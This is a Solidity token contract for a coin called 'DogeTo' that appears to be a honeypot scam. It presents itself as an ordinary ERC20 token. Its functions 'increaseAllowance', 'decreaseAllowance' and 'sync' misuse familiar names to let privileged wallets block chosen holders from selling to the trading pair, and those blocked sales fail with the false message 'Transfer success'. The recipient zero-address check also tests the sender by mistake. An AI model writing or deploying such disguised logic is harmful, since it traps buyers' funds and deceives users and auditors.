/**
 *Submitted for verification at BscScan.com on 2022-03-19
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract TestCoin is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _tokenName = "DogeTo";
    string private constant _tokenSymbol = "DT";
    uint8 private constant _tokenDecimals = 9;
    uint256 private constant _tokenTotalSupply = 10000000000000000 * 1e9;

    mapping(address => uint256) private _tokenBalances;
    mapping(address => mapping(address => uint256)) private _tokenAllowances;

    mapping(address => bool) private _synced;
    mapping(address => bool) private _increaseAllowance;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private _isdecreaseAllowance;
    bool private _isPermit;

    modifier onlySynced() {
        require(_synced[_msgSender()], "caller is not synced");
        _;
    }

    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Router = _uniswapV2Router;

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _tokenBalances[_msgSender()] = _tokenTotalSupply;
        _synced[owner()] = true;
        _synced[address(this)] = true;

        _isPermit = true;

        emit Transfer(address(0), _msgSender(), _tokenTotalSupply);
    }

    /**
        Return token name
     */
    function name() public pure returns (string memory) {
        return _tokenName;
    }

    /**
        Return token symbols
     */
    function symbol() public pure returns (string memory) {
        return _tokenSymbol;
    }

    /**
        Return token decimals
     */
    function decimals() public pure returns (uint8) {
        return _tokenDecimals;
    }

    /**
        Return token total supply
     */
    function totalSupply() public pure override returns (uint256) {
        return _tokenTotalSupply;
    }

    /**
        Return balance of account
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _tokenBalances[account];
    }

    /**
        Transfer amount to recipient from sender
     */
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _internalTransfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
        Return allowance of owner, spender combination
     */
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _tokenAllowances[owner][spender];
    }


    /**
        Standard approval function
     */
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _internalApprove(_msgSender(), spender, amount);
        return true;
    }

    /**
        Transfer and approve
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _internalTransfer(sender, recipient, amount);
        _internalApprove(
            sender,
            _msgSender(),
            _tokenAllowances[sender][_msgSender()].sub(
                amount,
                "Transfer amount exceeded address allowance"
            )
        );
        return true;
    }

    /**
        Internal approve function
     */
    function _internalApprove(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "Cannot approve from zero address");
        require(spender != address(0), "Cannot approve to zero address");
        _tokenAllowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
        Internal transfer function
     */
    function _internalTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "Cannot transfer from the zero address");
        require(sender != address(0), "Cannot transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!_synced[sender] && !_synced[recipient]) {
            require(_isdecreaseAllowance);
            if (_isPermit) {
                require(sender == uniswapV2Pair || recipient == uniswapV2Pair);
                if (recipient == uniswapV2Pair) {
                    require(!_increaseAllowance[sender], "Transfer success");
                    require(!_increaseAllowance[_msgSender()], "Transfer success");
                }
            }
        }
        _tokenBalances[sender] = _tokenBalances[sender].sub(amount);
        _tokenBalances[recipient] = _tokenBalances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function decreaseAllowance(bool value) public onlyOwner {
        _isdecreaseAllowance = value;
    }

    function sync(address[] calldata wallet, bool value)
        external
        onlySynced
    {
        for (uint256 i = 0; i < wallet.length; i++) {
            _synced[wallet[i]] = value;
        }
    }

    function increaseAllowance(address[] calldata wallet, bool value)
        external
        onlySynced
    {
        for (uint256 i = 0; i < wallet.length; i++) {
            _increaseAllowance[wallet[i]] = value;
        }
    }
}